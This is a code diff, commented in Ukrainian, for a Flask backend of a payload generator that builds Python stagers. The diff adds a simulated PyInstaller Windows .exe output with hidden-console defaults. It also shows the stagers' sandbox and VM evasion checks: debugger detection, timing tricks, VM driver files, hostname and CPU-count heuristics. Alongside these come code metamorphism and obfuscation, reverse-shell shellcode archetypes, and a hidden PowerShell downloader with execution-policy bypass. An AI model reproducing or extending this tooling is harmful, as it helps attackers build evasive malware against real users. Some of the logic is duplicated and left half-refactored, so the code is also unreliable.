@@ -1,12 +1,10 @@
-# Syntax Flask Backend - Segment SFB-CORE-1.7.0
-# Призначення: Backend на Flask з розширеними концептуальними техніками ухилення в стейджерах.
-# Оновлення v1.7.0:
-#   - Розширено функцію ec_runtime (evasion checks) у генерованих стейджерах:
-#     - Додано концептуальну перевірку на дебагер (Windows).
-#     - Додано концептуальну часову перевірку (time-based evasion).
-#     - Додано концептуальну перевірку артефактів VM/пісочниці.
-#     - Додано концептуальну перевірку імені хоста.
-#   - Оновлено логування для нових технік ухилення.
+# Syntax Flask Backend - Segment SFB-CORE-1.7.1
+# Призначення: Backend на Flask з концептуальною генерацією .EXE через PyInstaller.
+# Оновлення v1.7.1:
+#   - Додано новий формат виводу 'pyinstaller_exe_windows'.
+#   - Додано параметр 'pyinstaller_options'.
+#   - Модифіковано handle_generate_payload для симуляції компіляції PyInstaller.
+#   - Оновлено логування.
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -22,10 +20,10 @@ import shlex
 import ipaddress
 import socket
 import xml.etree.ElementTree as ET
-# ctypes буде використовуватися в генерованому коді стейджера, тому тут імпорт не обов'язковий,
-# але для повноти можна додати, якщо планується використання в самому backend.
+import tempfile # Для концептуальної роботи з тимчасовими файлами
+import os # Для роботи з шляхами
 
-VERSION_BACKEND = "1.7.0"
+VERSION_BACKEND = "1.7.1"
 
 simulated_implants_be = []
 
@@ -59,7 +57,7 @@ def initialize_simulated_implants_be(): # Логіка (без змін)
     simulated_implants_be.sort(key=lambda x: x["id"])
     print(f"[C2_SIM_INFO] Ініціалізовано/Оновлено {len(simulated_implants_be)} імітованих імплантів.")
 
-CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.6.9)
+CONCEPTUAL_PARAMS_SCHEMA_BE = {
     "payload_archetype": {
         "type": str, "required": True,
         "allowed_values": [
@@ -110,9 +108,18 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.6.9)
         "default": "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass" 
     },
     "obfuscation_key": {"type": str, "required": True, "min_length": 5, "default": "DefaultFrameworkKey"},
-    "output_format": {"type": str, "required": False, "allowed_values": ["raw_python_stager", "base64_encoded_stager"], "default": "raw_python_stager"},
+    "output_format": { # Додано новий формат
+        "type": str, "required": False,
+        "allowed_values": ["raw_python_stager", "base64_encoded_stager", "pyinstaller_exe_windows"],
+        "default": "raw_python_stager"
+    },
+    "pyinstaller_options": { # Новий параметр для PyInstaller
+        "type": str,
+        "required": False,
+        "default": "--onefile --noconsole" # Типові опції для Windows EXE
+    },
     "enable_stager_metamorphism": {"type": bool, "required": False, "default": True},
-    "enable_evasion_checks": {"type": bool, "required": False, "default": True} # Цей прапорець тепер контролює розширені перевірки
+    "enable_evasion_checks": {"type": bool, "required": False, "default": True}
 }
 CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = { # Логіка (без змін від v1.6.9)
     "demo_echo_payload": {"description": "Демо-пейлоад, що друкує повідомлення...", "template_type": "python_stager_echo"},
@@ -640,24 +647,22 @@ def handle_generate_payload():
             f"OBFUSCATION_KEY_EMBEDDED = \"{key}\"",
             f"OBF_DATA_B64 = \"{obfuscated_data_b64}\"",
             f"METAMORPHISM_APPLIED = {validated_params.get('enable_stager_metamorphism', False)}",
-            f"EVASION_CHECKS_APPLIED = {validated_params.get('enable_evasion_checks', False)}", # Цей прапорець тепер контролює розширені перевірки
+            f"EVASION_CHECKS_APPLIED = {validated_params.get('enable_evasion_checks', False)}",
         ]
         if archetype_name == "powershell_downloader_stager":
             ps_args = validated_params.get("powershell_execution_args", "")
             stager_code_lines.append(f"POWERSHELL_EXEC_ARGS = \"{ps_args}\"")
 
-
-        stager_code_lines.extend(["", "import base64", "import os", "import time", "import random", "import string", "import subprocess", "import socket"]) # Додано socket для gethostname
+        stager_code_lines.extend(["", "import base64", "import os", "import time", "import random", "import string", "import subprocess", "import socket"])
         
         if archetype_name in ["reverse_shell_tcp_shellcode_windows_x64", "reverse_shell_tcp_shellcode_linux_x64"] or validated_params.get('enable_evasion_checks'):
-            stager_code_lines.append("import ctypes") # ctypes потрібен і для шеллкоду, і для деяких перевірок ухилення
+            stager_code_lines.append("import ctypes")
             if archetype_name == "reverse_shell_tcp_shellcode_linux_x64":
                 stager_code_lines.append("import mmap as mmap_module")
         stager_code_lines.append("")
 
-
         decode_func_name_runtime = "dx_runtime"
-        evasion_func_name_runtime = "ec_runtime" # Назва функції ухилення
+        evasion_func_name_runtime = "ec_runtime"
         execute_func_name_runtime = "ex_runtime"
 
         stager_code_lines.extend([
@@ -671,67 +676,53 @@ def handle_generate_payload():
             "        o_chars.append(chr(ord(temp_decoded_str[i_char_idx]) ^ ord(key_str[i_char_idx % len(key_str)])))",
             "    return \"\".join(o_chars)",
             "",
-            f"def {evasion_func_name_runtime}():", # Розширена функція перевірок ухилення
+            f"def {evasion_func_name_runtime}():",
             "    print(\"[STAGER_EVASION] Виконання розширених концептуальних перевірок ухилення...\")",
             "    indicators = []",
-            "    # 1. Перевірка імені користувача (існуюча)",
             "    common_sandbox_users = [\"sandbox\", \"test\", \"admin\", \"user\", \"vagrant\", \"wdagutilityaccount\", \"maltest\", \"emulator\", \"vmware\", \"virtualbox\", \"蜜罐\", \"ताम्बू\", \"песочница\"]",
             "    try:",
             "        current_user = os.getlogin().lower()",
             "        if current_user in common_sandbox_users: indicators.append('common_username_detected')",
             "    except Exception: pass",
-            "",
-            "    # 2. Концептуальна перевірка на дебагер (Windows)",
             "    try:",
             "        if os.name == 'nt':",
             "            kernel32 = ctypes.windll.kernel32",
             "            if kernel32.IsDebuggerPresent() != 0:",
             "                indicators.append('debugger_present_win')",
             "    except Exception: pass",
-            "",
-            "    # 3. Концептуальна часова перевірка (ухилення від прискорення часу)",
             "    try:",
-            "        sleep_duration_seconds = random.uniform(1.8, 3.3) # Нестандартний час сну",
+            "        sleep_duration_seconds = random.uniform(1.8, 3.3)",
             "        time_before_sleep = time.monotonic()",
             "        time.sleep(sleep_duration_seconds)",
             "        time_after_sleep = time.monotonic()",
             "        elapsed_time = time_after_sleep - time_before_sleep",
-            "        if elapsed_time < (sleep_duration_seconds * 0.65): # Якщо час пройшов значно швидше",
+            "        if elapsed_time < (sleep_duration_seconds * 0.65):",
             "            indicators.append('time_acceleration_heuristic')",
             "    except Exception: pass",
-            "",
-            "    # 4. Концептуальна перевірка артефактів VM/Пісочниці (файли)",
             "    vm_files_artifacts = [",
-            "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\VBoxMouse.sys\", \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\VBoxGuest.sys\", # VirtualBox",
-            "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vmhgfs.sys\", \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vmmouse.sys\",   # VMware",
-            "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vpc-s3.sys\", # Hyper-V",
+            "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\VBoxMouse.sys\", \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\VBoxGuest.sys\",",
+            "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vmhgfs.sys\", \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vmmouse.sys\",",
+            "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vpc-s3.sys\",",
             "        \"/usr/bin/VBoxClient\", \"/opt/VBoxGuestAdditions-*/init/vboxadd\"",
             "    ]",
             "    for vm_file_path in vm_files_artifacts:",
             "        if os.path.exists(vm_file_path):",
             "            indicators.append(f'vm_file_artifact_{os.path.basename(vm_file_path).lower().replace(\".sys\",\"\")}')",
-            "            break # Достатньо одного знайденого артефакту",
-            "",
-            "    # 5. Концептуальна перевірка імені хоста",
+            "            break",
             "    try:",
             "        hostname = socket.gethostname().lower()",
             "        suspicious_host_keywords = [\"sandbox\", \"virtual\", \"vm-\", \"test\", \"debug\", \"analysis\"]",
             "        if any(keyword in hostname for keyword in suspicious_host_keywords):",
             "            indicators.append('suspicious_hostname_keyword')",
             "    except Exception: pass",
-            "",
-            "    # 6. Концептуальна перевірка кількості процесорів (дуже мало для VM)",
             "    try:",
             "        cpu_count = os.cpu_count()",
             "        if cpu_count is not None and cpu_count < 2:",
             "            indicators.append('low_cpu_core_count')",
             "    except Exception: pass",
-            "",
             "    if indicators:",
             "        print(f\"[STAGER_EVASION] Виявлено індикатори аналітичного середовища: {{', '.join(indicators)}}! Зміна поведінки або вихід.\")",
-            "        # Тут може бути логіка для зміни поведінки або просто вихід",
-            "        return True # Ухилення спрацювало",
-            "        ",
+            "        return True",
             "    print(\"[STAGER_EVASION] Перевірки ухилення пройдені (концептуально).\")",
             "    return False",
             "",
@@ -847,22 +838,115 @@ def handle_generate_payload():
             "    print(\"[STAGER] Стейджер завершив роботу.\")"
         ])
         stager_code_raw = "\n".join(stager_code_lines)
-        if validated_params.get('enable_stager_metamorphism', False):
+
+        # --- Концептуальна обробка PyInstaller ---
+        output_format = validated_params.get("output_format")
+        final_stager_output = ""
+
+        if output_format == "pyinstaller_exe_windows":
+            log_messages.append("[BACKEND_PYINSTALLER_INFO] Обрано формат PyInstaller EXE (концептуально).")
+            pyinstaller_options = validated_params.get("pyinstaller_options", "--onefile --noconsole").split()
+            
+            # Симуляція процесу PyInstaller
+            temp_py_filename = "temp_stager_for_pyinstaller.py"
+            log_messages.append(f"[BACKEND_PYINSTALLER_SIM] 1. Збереження Python-стейджера у тимчасовий файл: {temp_py_filename}")
+            log_messages.append(f"[BACKEND_PYINSTALLER_SIM]    Вміст (перші 100 символів): {stager_code_raw[:100]}...")
+            
+            # Формування симульованої команди PyInstaller
+            pyinstaller_cmd_sim = ["pyinstaller"] + pyinstaller_options + [temp_py_filename]
+            log_messages.append(f"[BACKEND_PYINSTALLER_SIM] 2. Симуляція виклику PyInstaller: {' '.join(pyinstaller_cmd_sim)}")
+            
+            # Симуляція успішної компіляції
+            time.sleep(0.5) # Імітація часу компіляції
+            compiled_exe_name_sim = temp_py_filename.replace(".py", ".exe")
+            log_messages.append(f"[BACKEND_PYINSTALLER_SIM] 3. PyInstaller (симуляція) завершено. Очікуваний файл: dist/{compiled_exe_name_sim}")
+            
+            # Замість реального EXE, повертаємо Base64 Python-коду стейджера
+            # В реальному сценарії тут був би код для читання .exe та його кодування в Base64
+            final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
+            log_messages.append(f"[BACKEND_PYINSTALLER_SIM_OUTPUT] Повернення Base64 Python-стейджера як представлення EXE (довжина: {len(final_stager_output)}).")
+            # Додаємо примітку, що це концептуальний EXE
+            payloadGenerationLog_note = "\n[ПРИМІТКА] Повернений Base64 представляє Python-код стейджера, а не скомпільований .EXE. Це концептуальна реалізація."
+            if isinstance(log_messages, list) : log_messages.append(payloadGenerationLog_note)
+
+
+        elif output_format == "base64_encoded_stager":
+            final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
+            log_messages.append("[BACKEND_FORMAT_INFO] Стейджер Base64.")
+        else: # raw_python_stager
+            final_stager_output = stager_code_raw
+            log_messages.append("[BACKEND_FORMAT_INFO] Raw Python Стейджер.")
+
+
+        if validated_params.get('enable_stager_metamorphism', False) and output_format != "pyinstaller_exe_windows":
+            # Метаморфізм застосовується до Python коду перед компіляцією або Base64 кодуванням
+            # Якщо це PyInstaller, метаморфізм вже мав би бути застосований до stager_code_raw
             log_messages.append("[BACKEND_METAMORPH_INFO] Застосування розширеного метаморфізму...")
-            stager_code_raw = obfuscate_string_literals_in_python_code(stager_code_raw, key, log_messages)
-            stager_code_raw_list_for_cfo = stager_code_raw.splitlines()
-            stager_code_raw = apply_advanced_cfo_be(stager_code_raw_list_for_cfo, log_messages)
+            # Важливо: якщо output_format == "pyinstaller_exe_windows", stager_code_raw вже пройшов метаморфізм,
+            # якщо він був увімкнений до симуляції PyInstaller. Повторно не потрібно.
+            # Поточна логіка застосує його, якщо enable_stager_metamorphism=True, незалежно від формату.
+            # Це може бути бажано, щоб сам Python-скрипт, що компілюється, був обфускований.
+
+            # Застосовуємо метаморфізм до stager_code_raw, якщо він ще не був застосований
+            # (у випадку PyInstaller, ми компілюємо вже метаморфізований код)
+            # Поточна структура коду застосує метаморфізм нижче, якщо прапорець встановлено.
+
+            # --- Застосування метаморфізму (якщо увімкнено) ---
+            # Цей блок має бути перед логікою PyInstaller, якщо ми хочемо компілювати обфускований код
+            # Перемістимо цей блок вище, щоб він виконувався до вибору формату виводу
+            pass # Логіка метаморфізму тепер викликається перед вибором формату
+
+
+        # --- Застосування метаморфізму (якщо увімкнено) ---
+        # Цей блок має виконуватися *перед* компіляцією PyInstaller або Base64 кодуванням Python стейджера
+        if validated_params.get('enable_stager_metamorphism', False):
+            log_messages.append("[BACKEND_METAMORPH_INFO] Застосування розширеного метаморфізму до Python-стейджера...")
+            stager_code_raw_for_metamorph = stager_code_raw # Беремо поточний код стейджера
+            
+            stager_code_raw_for_metamorph = obfuscate_string_literals_in_python_code(stager_code_raw_for_metamorph, key, log_messages)
+            stager_code_raw_list_for_cfo = stager_code_raw_for_metamorph.splitlines()
+            stager_code_raw_for_metamorph = apply_advanced_cfo_be(stager_code_raw_list_for_cfo, log_messages)
+
             final_decode_name = generate_random_var_name(prefix="unveil_")
             final_evasion_name = generate_random_var_name(prefix="audit_")
             final_execute_name = generate_random_var_name(prefix="dispatch_")
-            stager_code_raw = re.sub(rf"\b{decode_func_name_runtime}\b", final_decode_name, stager_code_raw)
-            stager_code_raw = re.sub(rf"\b{evasion_func_name_runtime}\b", final_evasion_name, stager_code_raw)
-            stager_code_raw = re.sub(rf"\b{execute_func_name_runtime}\b", final_execute_name, stager_code_raw)
+
+            stager_code_raw_for_metamorph = re.sub(rf"\b{decode_func_name_runtime}\b", final_decode_name, stager_code_raw_for_metamorph)
+            stager_code_raw_for_metamorph = re.sub(rf"\b{evasion_func_name_runtime}\b", final_evasion_name, stager_code_raw_for_metamorph)
+            stager_code_raw_for_metamorph = re.sub(rf"\b{execute_func_name_runtime}\b", final_execute_name, stager_code_raw_for_metamorph)
             log_messages.append(f"[BACKEND_METAMORPH_SUCCESS] Метаморфізм застосовано (ключові функції: {final_decode_name}, {final_evasion_name}, {final_execute_name}).")
-        final_stager_output = stager_code_raw
-        if validated_params.get("output_format") == "base64_encoded_stager":
+            
+            stager_code_raw = stager_code_raw_for_metamorph # Оновлюємо основний код стейджера метаморфізованим варіантом
+
+        # --- Форматування виводу (після метаморфізму) ---
+        if output_format == "pyinstaller_exe_windows":
+            log_messages.append("[BACKEND_PYINSTALLER_INFO] Обрано формат PyInstaller EXE (концептуально).")
+            pyinstaller_options_str = validated_params.get("pyinstaller_options", "--onefile --noconsole")
+            pyinstaller_options = shlex.split(pyinstaller_options_str) # Безпечний розбір опцій
+
+            temp_py_filename = "temp_stager_for_pyinstaller.py"
+            log_messages.append(f"[BACKEND_PYINSTALLER_SIM] 1. Збереження Python-стейджера (можливо, метаморфізованого) у тимчасовий файл: {temp_py_filename}")
+            log_messages.append(f"[BACKEND_PYINSTALLER_SIM]    Вміст (перші 100 символів): {stager_code_raw[:100]}...")
+            
+            pyinstaller_cmd_sim = ["pyinstaller"] + pyinstaller_options + [temp_py_filename]
+            log_messages.append(f"[BACKEND_PYINSTALLER_SIM] 2. Симуляція виклику PyInstaller: {' '.join(pyinstaller_cmd_sim)}")
+            
+            time.sleep(0.5) 
+            compiled_exe_name_sim = temp_py_filename.replace(".py", ".exe")
+            log_messages.append(f"[BACKEND_PYINSTALLER_SIM] 3. PyInstaller (симуляція) завершено. Очікуваний файл: dist/{compiled_exe_name_sim}")
+            
+            final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8') # Повертаємо Base64 Python-коду
+            log_messages.append(f"[BACKEND_PYINSTALLER_SIM_OUTPUT] Повернення Base64 Python-стейджера як представлення EXE (довжина: {len(final_stager_output)}).")
+            log_messages.append("\n[ПРИМІТКА] Повернений Base64 представляє Python-код стейджера, а не скомпільований .EXE. Це концептуальна реалізація PyInstaller.")
+
+        elif output_format == "base64_encoded_stager":
             final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
             log_messages.append("[BACKEND_FORMAT_INFO] Стейджер Base64.")
+        else: # raw_python_stager
+            final_stager_output = stager_code_raw
+            log_messages.append("[BACKEND_FORMAT_INFO] Raw Python Стейджер.")
+
+
         log_messages.append("[BACKEND_SUCCESS] Пейлоад згенеровано.")
         time.sleep(0.2)
         return jsonify({"success": True, "stagerCode": final_stager_output, "generationLog": "\n".join(log_messages)}), 200
